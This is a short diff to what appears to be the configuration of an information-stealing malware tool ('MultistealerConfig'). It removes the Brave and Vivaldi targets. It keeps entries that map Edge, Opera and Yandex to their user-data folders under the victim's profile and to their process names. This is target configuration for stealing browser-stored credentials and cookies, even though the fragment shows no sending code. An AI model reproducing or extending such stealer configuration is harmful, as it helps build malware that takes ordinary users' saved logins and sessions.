@@ -14,8 +14,6 @@ class Browsers(Enum):
     OPERA_GX = "Opera GX"
     OPERA_DEFAULT = "Opera Default"
     EDGE = "Microsoft Edge"
-    BRAVE = "Brave"
-    VIVALDI = "Vivaldi"
     YANDEX = "Yandex"
 
 
@@ -46,14 +44,6 @@ class MultistealerConfig:
         Browsers.EDGE: {
             "path": rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
             "process": "msedge.exe",
-        },
-        Browsers.BRAVE: {
-            "path": rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
-            "process": "brave.exe",
-        },
-        Browsers.VIVALDI: {
-            "path": rf"{user_profile}\AppData\Local\Vivaldi\User Data",
-            "process": "vivaldi.exe",
         },
         Browsers.YANDEX: {
             "path": rf"{user_profile}\AppData\Local\Yandex\YandexBrowser\User Data",
